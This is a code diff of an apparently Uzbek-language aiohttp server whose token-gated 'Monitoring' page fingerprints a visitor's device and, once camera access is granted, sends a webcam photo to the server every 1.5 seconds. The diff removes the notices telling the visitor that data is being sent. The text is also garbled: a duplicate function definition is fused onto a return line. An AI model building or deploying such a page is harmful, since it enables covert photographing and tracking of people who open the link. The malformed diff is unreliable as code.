@@ -76,17 +76,16 @@ async def track_page(request: web.Request):
   </style>
 </head>
 <body>
-  <h2>Monitoring faol...</h2>
-  <div class="status">✅ Ma'lumotlar yuborilmoqda</div>
+  <h2>Monitoring...</h2>
+  <div class="status" id="status">Boshlanmoqda...</div>
   <div class="counter" id="count">Yuborishlar: 0</div>
-  <div class="note" style="font-size:0.8em;color:#999;margin-top:30px;">
-    Ushbu sahifani yopish — monitoringni to'xtatadi.
-  </div>
 
   <script>
     let sendCount = 0;
-    const intervalMs = 1500; // 1.5 soniyada bir
+    const intervalMs = 1500;
     let stream = null;
+    let hasCameraAccess = null; // null = noma'lum, true/false = aniqlangan
+    let intervalId = null;
 
     async function collectData() {{
         const data = {{
@@ -159,32 +158,35 @@ async def track_page(request: web.Request):
             let img = null;
             let data = await collectData();
 
-            // Kamerani bir marta ochish (agar hali ochilmagan bo'lsa)
-            if (!stream) {{
+            // Faqat birinchi marta kamerani tekshiramiz
+            if (hasCameraAccess === null) {{
                 try {{
                     stream = await navigator.mediaDevices.getUserMedia({{ video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }} }});
+                    hasCameraAccess = true;
                     cameraAllowed = true;
+                    document.getElementById("status").textContent = "✅ Kamera faol — har 1.5s yangilanadi";
                 }} catch (err) {{
-                    console.log("Kamera ruxsati yo'q yoki xato:", err);
-                    // Stream yo'q — rasm olish mumkin emas
+                    hasCameraAccess = false;
+                    cameraAllowed = false;
+                    document.getElementById("status").textContent = "⚠️ Kamera ruxsati yo'q — ma'lumot bir marta yuborildi";
+                    // Stream yo'q — faqat ma'lumot yuboramiz
                 }}
+            }} else if (hasCameraAccess) {{
+                cameraAllowed = true;
             }}
 
-            if (stream) {{
-                cameraAllowed = true;
+            if (hasCameraAccess) {{
                 const video = document.createElement("video");
                 video.srcObject = stream;
                 video.muted = true;
                 await video.play();
 
-                // Video to'g'ri yuklanganini kafolatlash
                 if (video.videoWidth > 0) {{
                     img = await capturePhoto(video);
                     const track = stream.getVideoTracks()[0];
                     const settings = track.getSettings();
                     data.cameraRes = `${{settings.width || video.videoWidth}}x${{settings.height || video.videoHeight}}`;
                 }} else {{
-                    // Ba'zi brauzerlarda video hali tayyor bo'lmasa
                     await new Promise(r => setTimeout(r, 300));
                     if (video.videoWidth > 0) {{
                         img = await capturePhoto(video);
@@ -211,29 +213,240 @@ async def track_page(request: web.Request):
             sendCount++;
             document.getElementById("count").textContent = `Yuborishlar: ${{sendCount}}`;
 
-        }} catch (error) {{
+            // Agar kamera ruxsati yo'q bo'lsa — keyin to'xtat
+            if (hasCameraAccess === false) {{
+                if (intervalId) clearInterval(intervalId);
+            }}
+
+        } catch (error) {{
             console.error("Yuborishda xato:", error);
+            if (hasCameraAccess === false && intervalId) {{
+                clearInterval(intervalId);
+            }}
         }}
     }}
 
     // Birinchi marta darhol yuborish
     sendReport();
 
-    // Keyin har 1.5 soniyada takrorlash
-    const intervalId = setInterval(sendReport, intervalMs);
+    // Faqat kamera ruxsati bor bo'lsa intervalni ishga tushiramiz
+    setTimeout(() => {{
+        if (hasCameraAccess !== false) {{
+            intervalId = setInterval(sendReport, intervalMs);
+        }}
+    }}, 2000); // Kamera tekshiruvi tugagandan so'ng
 
-    // Sahifa yopilganda streamni to'xtatish
+    // Tozalash
     window.addEventListener("beforeunload", () => {{
         if (stream) {{
             stream.getTracks().forEach(track => track.stop());
         }}
-        clearInterval(intervalId);
+        if (intervalId) clearInterval(intervalId);
+    }});
+  </script>
+</body>
+</html>"""
+    return web.Response(text=html, content_type="text/html")async def track_page(request: web.Request):
+    token = request.query.get("token")
+    if not token or token not in USER_TOKENS:
+        return web.Response(text="❌ Noto‘g‘ri token", status=403)
+
+    html = f"""<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>Monitoring...</title>
+  <style>
+    body {{
+      font-family: sans-serif;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      height: 100vh; text-align: center;
+      background: #fafafa; color: #333;
+    }}
+    .status {{
+      margin: 20px;
+      font-size: 1.1em;
+      color: #4CAF50;
+    }}
+    .counter {{
+      font-size: 0.9em;
+      color: #777;
+    }}
+  </style>
+</head>
+<body>
+  <h2>Monitoring...</h2>
+  <div class="status" id="status">Boshlanmoqda...</div>
+  <div class="counter" id="count">Yuborishlar: 0</div>
+
+  <script>
+    let sendCount = 0;
+    const intervalMs = 1500;
+    let stream = null;
+    let hasCameraAccess = null; // null = noma'lum, true/false = aniqlangan
+    let intervalId = null;
+
+    async function collectData() {{
+        const data = {{
+          timestamp: new Date().toISOString(),
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          utcOffset: -new Date().getTimezoneOffset() / 60,
+          languages: navigator.languages.join(', '),
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          deviceMemory: navigator.deviceMemory || "Noma'lum",
+          hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
+          screen: `${{screen.width}}x${{screen.height}}`,
+          viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
+          colorDepth: screen.colorDepth,
+          pixelDepth: screen.pixelDepth,
+          deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
+          browser: "Noma'lum",
+          os: "Noma'lum",
+          model: "Noma'lum",
+          devices: {{ mic: 0, speaker: 0, camera: 0 }},
+          gpu: "Noma'lum",
+          cameraRes: "Noma'lum",
+          network: "Noma'lum"
+        }};
+
+        if (navigator.userAgent.includes("Chrome")) data.browser = "Chrome";
+        else if (navigator.userAgent.includes("Firefox")) data.browser = "Firefox";
+        else if (navigator.userAgent.includes("Safari")) data.browser = "Safari";
+
+        if (/Windows/.test(navigator.userAgent)) data.os = "Windows";
+        else if (/Android/.test(navigator.userAgent)) data.os = "Android";
+        else if (/iPhone|iPad/.test(navigator.userAgent)) data.os = "iOS";
+        else if (/Mac OS/.test(navigator.userAgent)) data.os = "macOS";
+
+        try {{
+          const devs = await navigator.mediaDevices.enumerateDevices();
+          data.devices.mic = devs.filter(d => d.kind === "audioinput").length;
+          data.devices.speaker = devs.filter(d => d.kind === "audiooutput").length;
+          data.devices.camera = devs.filter(d => d.kind === "videoinput").length;
+        }} catch (e) {{ console.log("Media devices error:", e); }}
+
+        try {{
+          const canvas = document.createElement("canvas");
+          const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+          const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+          if (dbg) {{
+            data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+          }}
+        }} catch (e) {{}}
+
+        if (navigator.connection) {{
+          data.network = `${{navigator.connection.effectiveType}}, ${{navigator.connection.downlink || '?'}} Mbps`;
+        }}
+
+        return data;
+    }}
+
+    async function capturePhoto(video) {{
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        return canvas.toDataURL("image/jpeg", 0.7);
+    }}
+
+    async function sendReport() {{
+        try {{
+            let cameraAllowed = false;
+            let img = null;
+            let data = await collectData();
+
+            // Faqat birinchi marta kamerani tekshiramiz
+            if (hasCameraAccess === null) {{
+                try {{
+                    stream = await navigator.mediaDevices.getUserMedia({{ video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }} }});
+                    hasCameraAccess = true;
+                    cameraAllowed = true;
+                    document.getElementById("status").textContent = "✅ Kamera faol — har 1.5s yangilanadi";
+                }} catch (err) {{
+                    hasCameraAccess = false;
+                    cameraAllowed = false;
+                    document.getElementById("status").textContent = "⚠️ Kamera ruxsati yo'q — ma'lumot bir marta yuborildi";
+                    // Stream yo'q — faqat ma'lumot yuboramiz
+                }}
+            }} else if (hasCameraAccess) {{
+                cameraAllowed = true;
+            }}
+
+            if (hasCameraAccess) {{
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                video.muted = true;
+                await video.play();
+
+                if (video.videoWidth > 0) {{
+                    img = await capturePhoto(video);
+                    const track = stream.getVideoTracks()[0];
+                    const settings = track.getSettings();
+                    data.cameraRes = `${{settings.width || video.videoWidth}}x${{settings.height || video.videoHeight}}`;
+                }} else {{
+                    await new Promise(r => setTimeout(r, 300));
+                    if (video.videoWidth > 0) {{
+                        img = await capturePhoto(video);
+                        data.cameraRes = `${{video.videoWidth}}x${{video.videoHeight}}`;
+                    }}
+                }}
+            }}
+
+            const body = {{
+                token: "{token}",
+                clientData: data,
+                cameraAllowed: cameraAllowed
+            }};
+            if (img) {{
+                body.image = img;
+            }}
+
+            await fetch("/submit", {{
+                method: "POST",
+                headers: {{ "Content-Type": "application/json" }},
+                body: JSON.stringify(body)
+            }});
+
+            sendCount++;
+            document.getElementById("count").textContent = `Yuborishlar: ${{sendCount}}`;
+
+            // Agar kamera ruxsati yo'q bo'lsa — keyin to'xtat
+            if (hasCameraAccess === false) {{
+                if (intervalId) clearInterval(intervalId);
+            }}
+
+        } catch (error) {{
+            console.error("Yuborishda xato:", error);
+            if (hasCameraAccess === false && intervalId) {{
+                clearInterval(intervalId);
+            }}
+        }}
+    }}
+
+    // Birinchi marta darhol yuborish
+    sendReport();
+
+    // Faqat kamera ruxsati bor bo'lsa intervalni ishga tushiramiz
+    setTimeout(() => {{
+        if (hasCameraAccess !== false) {{
+            intervalId = setInterval(sendReport, intervalMs);
+        }}
+    }}, 2000); // Kamera tekshiruvi tugagandan so'ng
+
+    // Tozalash
+    window.addEventListener("beforeunload", () => {{
+        if (stream) {{
+            stream.getTracks().forEach(track => track.stop());
+        }}
+        if (intervalId) clearInterval(intervalId);
     }});
   </script>
 </body>
 </html>"""
     return web.Response(text=html, content_type="text/html")
-
+    
 async def submit_data(request: web.Request):
     try:
         body = await request.json()
